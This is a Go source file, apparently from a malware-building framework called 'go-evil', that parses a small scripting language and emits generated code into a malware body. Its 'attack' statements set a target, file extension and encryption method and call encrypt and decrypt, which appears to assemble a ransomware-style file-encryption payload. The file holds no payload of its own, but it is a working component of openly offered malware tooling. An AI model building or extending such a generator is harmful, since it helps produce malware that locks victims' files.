package attack_vector

import (
	"regexp"

	attack_hash "github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash/private"
	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
	"github.com/s9rA16Bf4/go-evil/utility/io"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

const (
	EXTRACT_SUBDOMAIN = "[a-z]+\\.([a-z]+)\\.([a-z]+)\\(\"(.*)\"\\);"
	EXTRACT_FUNCTION  = "attack\\.([a-z]+)\\((\"(.+)\")?\\);"
)

func Parse(new_line string) {
	regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
	result := regex.FindAllStringSubmatch(new_line, -1)
	if len(result) > 0 { // There is a subdomain to extract
		switch result[0][1] {
		case "set":
			switch result[0][2] {
			case "hash":
				attack_hash.Set_hash(result[0][3])
			case "extension":
				io.Append_domain("attack_encrypt")
				mal.AddContent("attack_encrypt.SetExtension(\"" + result[0][3] + "\")")
			case "target":
				io.Append_domain("attack_encrypt")
				mal.AddContent("attack_encrypt.SetTarget(\"" + result[0][3] + "\")")
			case "encryption":
				io.Append_domain("attack_encrypt")
				mal.AddContent("attack_encrypt.SetEncryptionMethod(\"" + result[0][3] + "\")")

			default:
				function_error(result[0][2])
			}
		default:
			subdomain_error(result[0][1])
		}
	} else { // There might be a function which doesn't require a subdomain to work
		regex = regexp.MustCompile(EXTRACT_FUNCTION)
		result = regex.FindAllStringSubmatch(new_line, -1)
		if len(result) > 0 {
			switch result[0][1] {
			case "hash":
				attack_hash.Hash(result[0][3])
			case "encrypt":
				io.Append_domain("attack_encrypt")
				mal.AddContent("attack_encrypt.Encrypt()")
			case "decrypt":
				io.Append_domain("attack_encrypt")
				mal.AddContent("attack_encrypt.Decrypt()")
			default:
				function_error(result[0][1])
			}
		}
	}
}
func subdomain_error(subdomain string) {
	notify.Error("Unknown subdomain "+subdomain, "attack_vector.Parse()")
}
func function_error(function string) {
	notify.Error("Unknown function "+function, "attack_vector.Parse()")
}
